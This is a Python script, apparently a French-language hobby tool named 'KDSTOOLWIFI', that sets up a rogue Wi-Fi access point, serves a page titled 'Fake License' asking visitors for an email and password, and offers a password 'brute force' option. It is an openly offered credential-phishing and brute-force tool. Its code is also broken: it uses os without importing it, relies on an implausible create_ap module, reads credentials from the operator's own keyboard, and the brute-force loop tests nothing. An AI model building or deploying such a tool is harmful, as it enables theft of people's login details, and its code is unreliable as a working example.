import netifaces as ni
import subprocess
import getpass
from colorama import init, Fore, Back, Style
import requests
import itertools
import http.server
import socketserver
import threading

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = getpass.getpass(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Détecte les interfaces réseau
interfaces = ni.interfaces()

# Recherche une interface Wi-Fi
wifi_interface = None
for interface in interfaces:
    if ni.AF_INET in ni.ifaddresses(interface):
        wifi_interface = interface
        break

if wifi_interface is None:
    print(Fore.RED + "Erreur : Aucune interface Wi-Fi disponible.")
    exit(1)

print(Fore.GREEN + f"Création du réseau Wi-Fi {wifi_name} sur l'interface {wifi_interface}...")

# Crée le réseau Wi-Fi using create_ap
import create_ap
ap = create_ap.CreateAP(wifi_interface, wifi_name, password)
ap.start()

print(Fore.GREEN + "Réseau Wi-Fi créé avec succès !")

# Crée une page HTML
html = """
<html>
  <body>
    <h1>Fake License</h1>
    <form>
      <label for="email">Email:</label>
      <input type="email" id="email" name="email"><br><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password"><br><br>
      <input type="submit" value="Submit">
    </form>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

# Créez un serveur HTTP simple pour servir la page HTML
def serve_http():
    with socketserver.TCPServer(("", 80), http.server.SimpleHTTPRequestHandler) as httpd:
        print("Serving HTTP on port 80...")
        httpd.serve_forever()

# Démarrez le serveur HTTP dans un thread séparé
threading.Thread(target=serve_http).start()

# Affiche une page de connexion pour les utilisateurs
print(Fore.CYAN + """
  _______
 /       \
|  Connexion au réseau Wi-Fi  |
 _______/
""")

while True:
    # Attends que quelqu'un se connecte
    subprocess.run(['iw', 'dev', wifi_interface, 'info'])

    # Affiche les informations de connexion
    print(Fore.GREEN + "Un utilisateur a tenté de se connecter !")
    print(Fore.CYAN + "Entrez votre adresse e-mail et votre mot de passe pour vous connecter : ")
    email = input("Adresse e-mail : ")
    password = input("Mot de passe : ")

    # Envoie les informations de connexion à Termux
    subprocess.run(['termux-clipboard-set', email])
    subprocess.run(['termux-clipboard-set', password])

    print(Fore.GREEN + "Informations de connexion envoyées à Termux !")

    # Redirige l'utilisateur vers la page HTML
    os.system(f"curl -X GET http://localhost:80/index.html")

    # Option pour brute forcer des mots de passe
    brute_force = input(Fore.CYAN + "Voulez-vous essayer de brute forcer des mots de passe ? (o/n) : ")
    if brute_force.lower() == 'o':
        # Demande le nom d'utilisateur et le fichier de mots de passe
        username = input("Nom d'utilisateur : ")
        password_file = input("Fichier de mots de passe : ")

        # Lit le fichier de mots de passe
        with open(password_file, 'r') as f:
            passwords = f.readlines()

        # Essaie chaque mot de passe
        for password in passwords:
            password = password.strip()
            print(Fore.CYAN + f"Essai du mot de passe : {password}")
            # Envoie le mot de passe à Termux
            subprocess.run(['termux-clipboard-set', password])
            # Redirige l'utilisateur vers la page HTML
            os.system(f"curl -X GET http://localhost:80/index.html")
